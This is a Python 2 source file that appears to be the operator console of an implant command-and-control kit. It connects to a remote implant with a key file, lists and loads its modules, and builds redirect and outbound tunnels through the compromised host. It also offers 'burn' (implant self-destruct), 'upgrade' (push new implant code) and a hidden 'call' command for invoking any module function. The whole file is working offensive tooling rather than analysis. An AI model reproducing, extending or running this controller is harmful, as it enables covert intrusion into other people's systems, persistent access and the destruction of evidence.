import cmd
import os
import Lp_FrontEndFunctions
import Lp_CursesDriver
import Lp_XmlParser
import Lp_RpcDispatcher
import string
import sys
import socket
import textwrap
import time
import subprocess
import signal
import platform
import threading
from datetime import datetime

BLOCKER_PORT      = 1340
RPC_DISPATCH_PORT = 1339
PRINT_PORT        = 1338
BACKEND_PORT      = 1337
FRONTEND_PORT     = 1336

#Prints anything recieved from the backend on port 1338.
class PrintThread(threading.Thread):
    def __init__(self,processor,lFile):
        self.sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        self.sock.bind(('127.0.0.1',PRINT_PORT))
        self.sock.settimeout(.1)
        self.cmdLoop=processor
        self.log=lFile
        
        threading.Thread.__init__(self)
        
    def run(self):
        
        while 1:
            try:
                stringIn,addr=self.sock.recvfrom(1024)
                if stringIn.find('RECV')>=0:
                    self.sock.sendto(stringIn,('127.0.0.1',RPC_DISPATCH_PORT))
                elif stringIn == '!!#QUIT':
                    break
                else:
                    print stringIn,
                    self.log.write(stringIn)
                sys.stdout.flush()
            except:
                continue
        self.sock.close()

#Parses input and executes the appropriate command.
class LpInputProcessing(cmd.Cmd):
    
    def __init__(self,functionsIn,lFile,lark,lsock):
        self.prompt="LP> "
        self.functions=functionsIn
        self.helpDict={}
        self.Modules={}
        self.architecture=''
        self.fMaps={}
        self.logFile=lFile
        self.lpArch=lark
        self.defaultOutDir=''
        self.lpSock=lsock
        self.printBlocker = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.printBlocker.bind(('127.0.0.1',BLOCKER_PORT))
        
        cmd.Cmd.__init__(self)

    def setDefaultOutDir(self):
        self.defaultOutDir = Lp_XmlParser.parseDefaultDir()
    
    def preloop(self):
        self.logFile.write(self.prompt)
        self.do_help("")
                    
    #This function is executed immediatly before the command entered by the user is handled by the
    #cmd class.  For a command that is a key in the function dictionary, the user input is handled
    #by the genericCmd function.
    def precmd(self,line):

        usrIn=line.split(" ")
        
        fName=self.__resolveFuncName(usrIn[0])

        if fName=='quit':
            return 'quit'
         
        for mod in self.Modules:
            #Is the commanded function a key in the dictionary for the module 'mod'?
            if fName in self.Modules[mod]:
                oldDict={}
                oldDict=self.Modules[mod][fName].copy()
                cmdRes=self.genericCmd(mod,usrIn)

                if cmdRes>=0 and fName=='burn':
                    self.lpSock.settimeout(60)
                    try:
                        burnConf = self.lpSock.recv(1024)
                        while burnConf.find('RECV RPC')<0:
                            burnConf = self.printBlocker.recv(1024)

                        retCode = burnConf[burnConf.find('rc=')+3:len(burnConf)-1]
                        if retCode == '0':
                            print "Burn Successful"
                            self.logFile.write("Burn Successful.\n")
                            return 'abort'
                        else:
                            print "Burn rpc returned an error: %s"%retCode
                            print "The implant may have burned."
                            self.lpSock.setblocking(1)
                            return ''
                        
                    except socket.timeout:
                        print "Did not receive confirmation of burn.  The implant may have burned."
                        self.logFile.write("Did not receive confirmation of burn. The implant may have burned.\n")
                        self.lpSock.setblocking(1)
                        return 'abort'
            
                elif cmdRes>=0 and fName=="upgrade":
                    stillActive=1
                    rpcRes=-1
                    ret=self.functions.cmdGeneric('port',
                                                  {'command':'!port','outport':str(FRONTEND_PORT),
                                                   'endOnString':'DONE'},
                                                  {})
                    self.lpSock.settimeout(60)
                    while stillActive==1:
                        try:
                            self.lpSock.sendto('!stat\n',('127.0.0.1',BACKEND_PORT))
                            stillActive=0

                            lineIn=self.lpSock.recv(1024)

                            while lineIn.find('DONE')<0:
                                if lineIn.find('RECV')>=0:
                                    rpcRes=int(lineIn[lineIn.find('rc=')+3:len(lineIn)])
                                elif lineIn.find('RPC ID')>=0:
                                    newLine=lineIn.find('\n')
                                    rpcN=int(lineIn[7:newLine])
                                    if rpcN==cmdRes:
                                        prog = lineIn[lineIn.find('Sent:')+6:
                                                      lineIn.find('\nTotal')]
                                        
                                        totalPkts = lineIn[lineIn.find('RPC:')+5:]
                                        print "\rProgress: %.1f%s"%((float(prog)/float(totalPkts)*
                                                                  100),'%'),

                                        sys.stdout.flush()
                                        stillActive=1
 
                                lineIn=self.lpSock.recv(1024)
  
                            line=''
                            time.sleep(.5)
                        except socket.timeout:
                            line='abort'
                            print 'Socket timed out while receiving status.  Backend is not responding.'
                            self.logFile.write('Socket timed out while receiving status.  Backend is not responding.\n')
                            break
                        except KeyboardInterrupt:
                            print "\nUpfile transfer aborted."
                            self.logFile.write('\nUpfile transfer aborted.\n')
                            return 'abort'

                    if rpcRes == 0:
                        print "Upgrade file sent."
                        self.logFile.write("Upgrade file sent.\n")
                        return 'abort'
                    else:
                        self.functions.cmdGeneric('port',{'command':'!port','outport':str(PRINT_PORT),
                                                          'endOnString':'DONE'},{})
                        self.lpSock.setblocking(1)
                        cmdRes = rpcRes
                        
                if cmdRes == -2:
                    line='abort'
                    break
    
                self.Modules[mod][fName]=oldDict
                return ""
            
        return line

    def deleteMod(self,toUnload,okToDelete):
        if okToDelete>0:
            return
        keys=self.Modules.keys()
        for key in keys:
            if self.Modules[key]['iface']==toUnload[0]:
                del self.Modules[key]
                del self.helpDict[key]

    def printTunnelCmd(self,tunnelCommand,okToPrint):
        if okToPrint==0:
            print tunnelCommand[0]
    
    #Handles user input if the commanded function has an entry in the function dictionary.
    #Arguments:
    #    mod:  the module that contains this function
    #    usrIn:  raw input that the user entered at the command prompt
    #Return:
    #    An integer representing the result of the function call
    def genericCmd(self,mod,usrIn):

        fName=self.__resolveFuncName(usrIn[0])
        
        newIn=[]
        #Strip empty strings from usrIn
        for el in usrIn:
            if el!='':
                newIn.append(el)
        
        usrIn=newIn    
        try:
            #Check if this function takes input arguments
            if self.Modules[mod][fName]['noargs']=="true":
                if len(usrIn)>1:
                    print "The command %s does not accept input arguments."%fName
                    self.logFile.write("The command %s does not accept input arguments.\n"%fName)
                    return
        except KeyError:
            print "No functions found for module '%s'"%mod
            self.logFile.write("No functions found for module '%s'"%mod)
            return -1

        if self.Modules[mod][fName]['confirm']=='1':
            try:
                confirmation=raw_input("Are you sure you want to execute %s?\nY\N: "%fName)
            except KeyboardInterrupt:
                print
                return -1
            self.logFile.write("Are you sure you want to execute %s?"%fName)
            self.logFile.write((confirmation+'\n'))
            if confirmation!='y' and confirmation!='Y':
                return -1
            
        #Check if this function should use a curses form.  If so, then extract the necessary arguments
        #from the curses return and call the function.
        if self.Modules[mod][fName]['curses']=="true" and len(usrIn)==1:
            self.logFile.write('Curses form entered.\n')
            arguments=[]
            formType=''
            
            if fName=='redirtunnel':
                formType='redir'
            elif fName=='outtunnel':
                formType='out'
            else:
                formType='default'
            
            form=Lp_CursesDriver.CursesDriver(
                                              self.Modules[mod][fName]['cursesPrompts'],
                                              len(self.Modules[mod][fName]['cursesPrompts']),
                                              formType
                                              )
            
            arguments=form.runCurses()
            self.logFile.write('***Raw output from curses form***\n')
            self.logFile.write('%s\n%s\n******\n'%(arguments[0],arguments[1]))
            
            #clear the screen to eliminate any oddities that result from the terminal being resized.
            os.system('clear')
            res=0
        
            for arg in arguments:
                
                validArg=self.__checkArg(arg)
                
                if arg!=[] and validArg==1:            
                    
                    argDict=dict(arg)

                    if 'transprot' in argDict:
                    
                        protocol=argDict['transprot']

                        if protocol=='udp' or protocol=='UDP':
                            argDict['transprot']='17'
                        elif protocol=='tcp' or protocol=='TCP':
                            argDict['transprot']='6'
                        else:
                            print "Bad Protocol Selection."
                            self.logFile.write("Bad Protocol Selection.\n")
                            return -1

                    argList=argDict.items()

                    #build string for creating this tunnel on command line
                    if fName=='redirtunnel' or fName=='outtunnel':
                        cmdString=fName+' netprot 2048'
                        for el in argList:
                            cmdString+=' '+el[0]+' '+el[1]

                    tunnelCmd='\nCommand to create this tunnel via command line:\n%s\n'%cmdString
                    
                    keys=argDict.keys()
                    
                    for key in keys:
                        try:
                            self.Modules[mod][fName][key]=argDict[key].rstrip()
                        except KeyError:
                            print "assignment failed"
                            self.logFile.write("assignment failed\n")
                            return
                    
                    res=self.functions.cmdGeneric(fName,self.Modules[mod][fName],{})
                
                    if fName=='redirtunnel' or fName=='outtunnel':
                        self.printTunnelCmd([tunnelCmd],0)
                   
                elif arg!=[] and validArg!=0:
                    print "Error.  Input not provided for %s."%validArg
                    self.logFile.write("Error.  Input not provided for %s.\n"%validArg)
    
            return res


        if self.Modules[mod][fName]['useDirList']=='1' and len(usrIn)==1:
            try:
                dirListParams=self.Modules[mod][fName]['dirListParams']
                directory=dirListParams['baseDir']
                if dirListParams['prependCWD']=='1':
                    directory='%s%s'%(os.getcwd(),directory)
                if dirListParams['appendImplantArch']=='1':
                    directory='%s/%s'%(directory,self.architecture)

                dirListing=[]
                initialList=os.listdir(directory)
                for item in initialList:
                    if item.find(dirListParams['fileEx'])>=0:
                        dirListing.append(item)

                moduleIndexes={}
                while 1:
                    print dirListParams['prePrint']
                    try:
                        if dirListParams['showIfaceNumbers']=='1':
                            for i in range(0, len(dirListing),1):
                                modName=dirListing[i].split(dirListParams['modNameSplitChar'])[0]
                                ifaceArgs=[modName,self.architecture, self.lpArch]
                                iface=Lp_XmlParser.parseIface(ifaceArgs)
                                if iface<0:
                                    print "Unable to find iface number for %s."%modName
                                    print "Ensure the xml file for this module is located in the proper directory."
                                else:
                                    print "%d: %s"%(iface,dirListing[i])

                                    #Create the mapping of iface number to position in list
                                    #This allows user to enter iface number to select mod
                                    moduleIndexes[iface]=i
                                    
                            input=raw_input(dirListParams['listPrompt'])
                            input=int(input)
                            selection=moduleIndexes[input]
                            self.Modules[mod][fName][dirListParams['promptToSet']]='%s/%s'%(directory,
                                                                                       dirListing[int(selection)])
                            break

                        else:
                            for i in range(0, len(dirListing),1):
                                print "%d: %s"%(i,dirListing[i])

                            selection=raw_input(dirListParams['listPrompt'])
                            self.Modules[mod][fName][dirListParams['promptToSet']]='%s/%s'%(directory,
                                                                                       dirListing[int(selection)])
                            break

                    except (IndexError, ValueError, KeyError):
                        print "\nInvalid selection.\n"

                if dirListParams['requireXml']=='1':
                    modStripped=dirListing[int(selection)].split(dirListParams['modNameSplitChar'])[0]
                    modFd=open('%s/%s.xml'%(directory,modStripped))
                    modFd.close()
            except IOError:
                print 'No xml configuration file found for this module.'
                return -1
            except OSError:
                print "%s not found."%directory
                self.logFile.write("%s not found.\n"%directory)
                
            except KeyboardInterrupt:
                print
                return -1       

        if self.Modules[mod][fName]['useSwitch']=='1' and len(usrIn)==1:
            try:
                switchParams=self.Modules[mod][fName]['switchParams']

                while 1:
                    response=raw_input(str(switchParams['prompt']))
                    possibleInputs=switchParams['switchOpts'].keys()
                    correctKey=0
                    for input in possibleInputs:
                        input=str(input)
                        res=input.find(response)
                        if res>=0:
                            correctKey=input

                    if correctKey==0:
                        print "Invalid selection."

                    else:
                        for argument in switchParams['switchOpts'][correctKey]:
                            try:
                                self.Modules[mod][fName][str(argument[0])]=str(argument[1])
                            except KeyError:
                                print "Internal Error: argument specified in switch not found as an argument for %s."%fName
                        break

            except KeyboardInterrupt:
                print
                return -1
            
        if self.Modules[mod][fName]['printFunc'] != [] and len(usrIn)==1:
            self.printFunctionOut(self.Modules[mod][fName]['printFunc'])

        if self.Modules[mod][fName]['useDefaultDir'] != [] and len(usrIn) == 1:
            argument = self.Modules[mod][fName]['useDefaultDir']     
            self.Modules[mod][fName][argument] = self.defaultOutDir

        #Extract arguments from the entered command and assign values in the function dictionary
        #if no other method of obtaining arguments is defined for this command.
        if len(usrIn)>1:
            
            for i in range(1,len(usrIn)-1,2):
                try:    
                    res=self.Modules[mod][fName][usrIn[i]]
                    self.Modules[mod][fName][usrIn[i]]=usrIn[i+1]
                except:
                    print "Incorrect argument: %s"%usrIn[i]
                    self.logFile.write("Incorrect argument: %s\n"%usrIn[i])
                    return

        if self.Modules[mod][fName]['useArgConfirm']=='1':
            res=self.functions.cmdGeneric(fName, self.Modules[mod][fName],
                                          self.Modules[mod][fName]['argConfirmParams'])
        else:
            res=self.functions.cmdGeneric(fName, self.Modules[mod][fName],{})
    
        return res

    #Used to print the result of a function when the lp needs to confirm the completion of the function that
    #caused the print.
    def printFunctionOut(self,func):
        self.printBlocker.sendto('!!#TURN_OFF_PRINTING',('127.0.0.1',RPC_DISPATCH_PORT))
        
        if func=='mods':
            print "******************Loaded Modules*****************"
            self.logFile.write("******************Loaded Modules*****************\n")
            res = self.functions.cmdGeneric('mods',{'command':'!mods'},{})
            self.printBlocker.sendto('!!#REG_BLOCK%d'%res,('127.0.0.1',RPC_DISPATCH_PORT))
            result = self.printBlocker.recv(1024)

        elif func=='listtunnels':
            res = self.functions.cmdGeneric('listtunnels',{'command':'!call','ciface':'34',
                                                           'cfunc':'2','cprov':'1'},{})
            
            self.printBlocker.sendto('!!#REG_BLOCK%d'%res,('127.0.0.1',RPC_DISPATCH_PORT))
            result = self.printBlocker.recv(1024)

        self.printBlocker.sendto('!!#TURN_ON_PRINTING',('127.0.0.1',RPC_DISPATCH_PORT))
        
    def parseXml(self, mod, requireLpEx):
        Lp_XmlParser.parseMod([self.helpDict, self.Modules, mod, self.architecture, self.lpArch, self.fMaps, 
                              requireLpEx, self.functions], 0)
        
    #The call command can be used to browse loaded modules and call any function from any loaded module.
    #It is intended as an advanced/developer command, and therefore will not be shown by help.  
    #It can be called by entering 'call' at the lp prompt. 
    def do_call(self,line):
        
        usrIn=line.split(" ")
        if len(usrIn)!=1:
            return
            #print "Incorrect number of arguments.  Enter \'help call\' for usage information."
        elif usrIn[0]=="":
            res=self.functions.cmdCall(self.printBlocker)
        else:
            return
            #print "Incorrect number of arguments.  Enter \'help call\' for usage information."
    
    #Prints all of the functions available from each module by going through helpDict
    def do_help(self,line):
        usrIn=line.split(" ")
        if line=="":
            print "****Available Commands****"
            self.logFile.write("****Available Commands****\n")
            keys=self.helpDict.keys()
            for key in keys:
                self.__printModuleFunctions(key)
                
        else:
            #Check if user entered a module name
            if usrIn[0] in self.helpDict:
                self.__printModuleFunctions(usrIn[0])
                return

            keys=self.helpDict.keys()

            #Check if user entered module iface number
            for key in keys:
                try:
                    modStr='padding/%s_debug.mo'%key
                    ifaceNum=Lp_XmlParser.parseIface([modStr, self.architecture, self.lpArch])
                    if str(ifaceNum)==usrIn[0]:
                        self.__printModuleFunctions(key)
                        return
                except KeyError:    
                    break

              
            fName=self.__resolveFuncName(usrIn[0])

            #Check if user entered a function name or number
            for key in keys:
                if fName in self.helpDict[key]:
                    use='\n%s\n'%textwrap.fill(self.helpDict[key][fName]['usage'])
                    text='%s\n'%textwrap.fill(self.helpDict[key][fName]['text'])
                    print use
                    self.logFile.write('%s\n'%use)
                    print text
                    self.logFile.write('%s\n'%text)
                    return 
            print "No help information found for: %s"%fName
            self.logFile.write("No help information found for: %s\n"%fName)
    
    #Binding for help command        
    def do_h(self,line):
        self.do_help(line)
        
    #Exits the LP without printing modules after receiving confirmation of burn.
    def do_abort(self,line):
        print "Goodbye"
        return True
    
    #Prints modules loaded and then exits the LP    
    def do_exit(self,line):
        #Display loaded modules on exit.  Port is changed to 1336 so that the front end can make sure
        #that the entire list is printed before exiting.
        try:
            self.printFunctionOut('mods')
            res=functions.cmdGeneric('term',{'command':'!term','endOnString':'DONE'},{})
            print "Goodbye"
            self.logFile.write("Goodbye\n")
            self.logFile.write('Session terminated at %s'%str(datetime.now()))
            return True
        except KeyboardInterrupt:
            print "Goodbye"
            self.logFile.write("Goodbye\n")
            self.logFile.write('Session terminated at %s'%str(datetime.now()))
            return True
    
    #Command binding to exit LP
    def do_quit(self,line):
        self.do_exit(line)
        return True
    
    #Command binding to exit LP
    def do_logout(self,line):
        self.do_exit(line)
        return True
    
    #Command binding to exit LP    
    def do_EOF(self,line):
        self.do_exit(line)
        return True
    
    def emptyline(self):
        pass
    
    def setArch(self,inArch):
        self.architecture=inArch
    
    def __sort(self,modKey,toSort):
        toReturn=[]
        fMaps={}
        fNums=[]
        for fName in toSort:
            fNum=self.helpDict[modKey][fName]['fnum']
            fMaps[int(str(fNum).split('.')[1])]=fName
            fNums.append(int(str(fNum).split('.')[1]))

        fNums=sorted(fNums)
        for num in fNums:
            toReturn.append(fMaps[num])

        return toReturn
    
    #Checks if there are any empty strings in a list returned by CursesDriver
    def __checkArg(self,toCheck):
        for element in toCheck:
            if element[1]=='':
                return element[0]
                
        return 1
        
    def __resolveFuncName(self,name):
        try:
            function=self.fMaps[name]
        except KeyError:
            function=name
            
        return function

    def __printModuleFunctions(self,modName):
        fKeys=self.helpDict[modName].keys()
        if len(fKeys)<=0:
            return
        print 'Module: %s'%modName
        self.logFile.write('Module: %s\n'%modName)
        sortedfKeys=self.__sort(modName,fKeys)
        for fKey in sortedfKeys:
            if self.helpDict[modName][fKey]['nodisplay']!="true":
                disp="   %s: %s"%(self.helpDict[modName][fKey]['fnum'],fKey)
                print disp
                self.logFile.write((disp+'\n'))
        print
    
#Forces backend to ignore TERM signals sent to the front end on ctrl-c
def preexec_fcn():
    signal.signal(signal.SIGINT,signal.SIG_IGN)    

#Connects to the implant and prints the currently loaded modules and implant uptime.
#Arguments:
#    proc: the Lp Input Processing object
#    sock: the socket used to communicate with backend
#Return:
#    1 on success
#    -1 in fail
def showWelcome(proc,func,sock,outFile,lpArch):
    
    currentDirectory=os.getcwd()
    supportedArchs={'062':'x86_64','003':'i386','020':'ppc','021':'ppc64',
                    '002':'sparc','008':'mips_be','010':'mips_le',
                    '040':'arm','043':'sparcv9'}
        
    openArgs={"command":"!open","dstip":sys.argv[1],"dstport":sys.argv[2],"srcip":sys.argv[3],
              "srcport":sys.argv[4],"keyfile":sys.argv[5],'endOnString':'DONE'}
    res = func.cmdGeneric('open',openArgs, {})

    try:
        line=sock.recv(1024)
    except:
        print "Failed to connect to implant."
        return -1

    lpexList = []
    allArches = []

    print "Loading Lp Extensions...",
    sys.stdout.flush()
    #load all lp extention files available

    try:
        allArches = os.listdir('%s/../Mods/App/Buzzdirection/'%(currentDirectory))
    except OSError:
        pass
    
    for oneArch in allArches:
        lpexDir = '%s/../Mods/App/Buzzdirection/%s/'%(currentDirectory,oneArch)
        lpexList += os.listdir(lpexDir)
    
    if lpArch == 'i386':
        lpexExtension = '.lx32'
    else:
        lpexExtension = '.lx64'
        
    for lpex in lpexList:
        if lpex.find(lpexExtension)>=0:
            fileLoc = '%s%s'%(lpexDir,lpex)
            func.cmdGeneric('lpex',{'command':'!lpex','lpexfile':fileLoc,'endOnString':'DONE'},{})

    print "\r",
        
    #Parse xml files for preloaded modules and print currently loaded modules
    func.cmdGeneric('port',{'command':'!port','outport':str(FRONTEND_PORT),'endOnString':'DONE'},{})

    res=func.cmdGeneric('mods',{'command':'!mods','endOnString':'DONE'},{})
    
    print "******************Loaded Modules*****************",
    try:
        line=sock.recv(1024)
        #while line.find("Device ID")<0:
        while line.find("RECV")<0:
            print line,
            outFile.write(line)
            if line.find('name')<0 and line.find('--')<0 and line.find("Device")<0:
                modName=line[8:25]
                modName=modName.strip()
                module=(modName+'.mo')
                if len(module)>3:
                    proc.parseXml(module,0)
                if modName=='PlatCore':
                    platCoreArch=line[46:len(line)].strip()
                    try:
                        proc.setArch(supportedArchs[platCoreArch])
                    except KeyError:            
                        print "The reported implant architecture type of %s is not supported."%platCoreArch
                        
                        return -1

            line=sock.recv(1024)
                  
    except socket.timeout:
        print "Failed to receive module list."
        outFile.write("Failed to receive module list.")
    except KeyboardInterrupt:
        return -1

    func.cmdGeneric('port',{'command':'!port','outport':str(PRINT_PORT),'endOnString':'DONE'},{})

    res=func.cmdGeneric('uptime',{'command':'!call','ciface':'2','cprov':'0','cfunc':'15'},{})
    proc.printBlocker.sendto('!!#REG_BLOCK%d'%res,('127.0.0.1',RPC_DISPATCH_PORT))
    result = proc.printBlocker.recv(1024)

    return 1

if __name__=='__main__':
    
    try:
        functions=0
        processor=0
        printThread=0
        log=0
        lpSock=0
        out=0
        ark=platform.architecture()[0]
        if ark=='32bit':
            lpArk='i386'
        else:
            lpArk='x86_64'
        curDir=os.getcwd()
        out=open((curDir+'/back.log'),'w+')
        
        try:
            logFiles=os.listdir('%s/Logs'%os.getcwd())
        except OSError:
            os.mkdir('%s/Logs'%curDir)
            logFiles=os.listdir('%s/Logs'%os.getcwd())
            
        numLogs=len(logFiles)
        logFiles.sort()
        
        #If there are more than 20 log files, delete the oldest one.
        if numLogs>20 and sys.argv[6]=='1':
            try:
                os.remove('%s/Logs/%s'%(curDir,logFiles[0]))
            except OSError:
                print "Unable to remove oldest logfile."
                
        
        date='%s'%datetime.date(datetime.now())
        cTime='%s'%datetime.time(datetime.now())
        cTime=cTime[:cTime.find('.')]
        logname='%s_%s_lp.log'%(date,cTime)
        log=open('%s/Logs/%s'%(curDir,logname),'w+')

        lpSock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        lpSock.bind(('127.0.0.1',FRONTEND_PORT))

        try:
            subprocess.call([(curDir+'/'+lpArk+'/ThrowUser_LinuxUser'),(curDir+'/'+lpArk+'/blob.lp')],
                            stdout=out,preexec_fn=preexec_fcn)
        except:
            print "Unable to locate back end executatble.  This should be located in Lp/<LP Architecture>"
            out.close()
            ThreadExit=0
            lpSock.close()
            sys.exit()
            
        time.sleep(1)

        functions=Lp_FrontEndFunctions.Lp_FrontEndFcns(lpSock,log)

        processor=LpInputProcessing(functions,log,lpArk,lpSock)
        processor.parseXml('Lp.mo',0)
        processor.setDefaultOutDir()

        functions.setProc(processor)
                
        printThread=PrintThread(processor,log)
        printThread.daemon=True
        printThread.start()

        rpcDispatch=Lp_RpcDispatcher.RpcDispatcher(processor)
        rpcDispatch.start()
        
        res=showWelcome(processor,functions,lpSock,log,lpArk)

        lpSock.sendto("!!#TURN_ON_PRINTING",('127.0.0.1',RPC_DISPATCH_PORT))
        
        if res>0:
            processor.cmdloop()

        lpSock.sendto("!!#QUIT",('127.0.0.1',RPC_DISPATCH_PORT))
        lpSock.sendto("!!#QUIT",('127.0.0.1',PRINT_PORT))
        subprocess.call(['killall','ThrowUser_LinuxUser'])
        out.close()
        log.close()
        lpSock.close()
    except KeyboardInterrupt:
        if functions!=0:
            res=functions.cmdGeneric('term',{'command':'!term','endOnString':'DONE'},{})
        if out !=0:
            try:
                out.close()
            except IOError:
                pass
            
        print "Goodbye"
        if log!=0:
            log.write('Goodbye\n')
            log.write('Session terminated at %s'%str(datetime.now()))
            log.close()
        lpSock.sendto("!!#QUIT",('127.0.0.1',RPC_DISPATCH_PORT))
        lpSock.sendto("!!#QUIT",('127.0.0.1',PRINT_PORT))
        subprocess.call(['killall','ThrowUser_LinuxUser'])
        if lpSock != 0:
            lpSock.close()
